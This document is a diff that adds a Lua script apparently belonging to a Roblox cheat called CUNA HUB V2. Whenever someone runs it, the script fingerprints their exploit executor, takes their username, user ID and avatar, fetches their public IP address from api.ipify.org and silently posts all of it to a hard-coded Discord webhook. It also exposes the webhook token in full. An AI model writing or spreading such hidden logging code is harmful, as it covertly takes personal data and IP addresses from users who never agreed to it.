@@ -1,0 +1,36 @@
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   WrapGlobal and "trash" or
+   IsElectron and "Electron" or
+   OXYGEN_LOADED and "Oxygen U" or
+   isexecutorclosure and "Script-WareV2" or
+   "감지 대상 제외 익스플로잇"
+local Name1 = game:GetService("Players").LocalPlayer
+local url = "https://discordapp.com/api/webhooks/954305471597117440/fs-z4w7UpI30WtaX7xgQK3tYTTNjj1E8VfIlaZzBtKK9X20A4jOH-jHXGAR57IKYuKPD"
+local data = {
+   ["content"] = "실행 감지됨",
+   ["embeds"] = {
+       {
+           ["title"] = (Name1.Name).."**이가 [CUNA HUB V2 SCRIPT]**를 "   ..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.. " 에서 실행했어요!",
+           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." | UserId: " .. game.Players.LocalPlayer.UserId.. " | exploit: **"..webhookcheck.."**" ,
+           ["type"] = "rich",
+           ["description"] = "아이피: "..game:HttpGet("https://api.ipify.org"),
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
